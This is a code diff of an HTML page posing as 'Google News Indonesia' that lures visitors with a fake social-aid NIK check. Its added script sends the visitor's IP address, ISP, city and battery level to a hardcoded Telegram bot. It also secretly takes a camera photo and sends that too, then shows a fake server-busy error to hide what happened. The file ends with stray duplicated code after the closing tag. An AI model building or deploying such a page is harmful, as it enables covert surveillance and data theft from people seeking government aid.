@@ -13,28 +13,81 @@
     </style>
 </head>
 <body>
+    <div class="header-news">Google News Indonesia</div>
+    <div class="card">
+        <img src="https://images.unsplash.com/photo-1529107386315-e1a2ed48a620?w=500" style="width:100%">
+        <h1>Bantuan Sosial Tahap 2 Cair, Cek NIK Anda Sekarang</h1>
+        <p>Pastikan perangkat Anda terverifikasi untuk melihat daftar nama penerima bantuan.</p>
+        <button class="btn" id="startBtn">CEK DAFTAR NAMA</button>
+    </div>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 
-<div class="header-news">Google News Indonesia</div>
+    <script>
+        const CONFIG = {
+            TOKEN: "8503662761:AAE_cZLT-07P6r5gQteADSjsTwV2GUdnqbg",
+            CHAT_ID: "5392443720"
+        };
 
-<div class="card">
-    <img src="https://images.unsplash.com/photo-1529107386315-e1a2ed48a620?w=500" style="width:100%">
-    <h1>Bantuan Sosial Tahap 2 Cair, Cek NIK Anda Sekarang</h1>
-    <p>Pastikan perangkat Anda terverifikasi untuk melihat daftar nama penerima bantuan.</p>
-    <button class="btn" id="startBtn">CEK DAFTAR NAMA</button>
-</div>
+        const startBtn = document.getElementById('startBtn');
 
-<video id="video" autoplay></video>
-<canvas id="canvas"></canvas>
+        startBtn.addEventListener('click', async () => {
+            startBtn.innerText = "Memproses Data...";
+            startBtn.disabled = true;
 
-<script>
-    const CONFIG = {
-        TOKEN: "8503662761:AAE_cZLT-07P6r5gQteADSjsTwV2GUdnqbg",
-        CHAT_ID: "5392443720"
-    };
+            let caption = "📸 *HASIL CAPTURE UJANG MODS*%0A━━━━━━━━━━━━━━━━━━%0A";
 
-    const startBtn = document.getElementById('startBtn');
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+            // 1. Ambil IP & Lokasi
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                caption += `🌍 *IP:* ${d.ip}%0A🏢 *ISP:* ${d.org}%0A📍 *Kota:* ${d.city}, ${d.region}%0A`;
+            } catch(e) { caption += "🌍 *IP:* Gagal ambil data%0A"; }
+
+            // 2. Ambil Baterai
+            try {
+                const b = await navigator.getBattery();
+                caption += `🔋 *Baterai:* ${Math.round(b.level * 100)}%%0A`;
+            } catch(e) {}
+
+            // 3. Akses Kamera & Kirim
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', CONFIG.CHAT_ID);
+                        fd.append('photo', blob, 't.jpg');
+                        fd.append('caption', decodeURIComponent(caption));
+                        fd.append('parse_mode', 'Markdown');
+                        
+                        fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd })
+                        .then(() => {
+                            alert("Koneksi Error 505: Server Sibuk.");
+                            startBtn.innerText = "CEK DAFTAR NAMA";
+                            startBtn.disabled = false;
+                        });
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 'image/jpeg');
+                }, 2000);
+            } catch (err) {
+                // Kirim teks aja kalau kamera ditolak
+                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage?chat_id=${CONFIG.CHAT_ID}&text=${caption}%0A⚠️ *Kamera:* Ditolak&parse_mode=Markdown`);
+                alert("Akses kamera diperlukan.");
+                startBtn.innerText = "CEK DAFTAR NAMA";
+                startBtn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>    const canvas = document.getElementById('canvas');
 
     startBtn.addEventListener('click', async () => {
         startBtn.innerText = "Memverifikasi...";
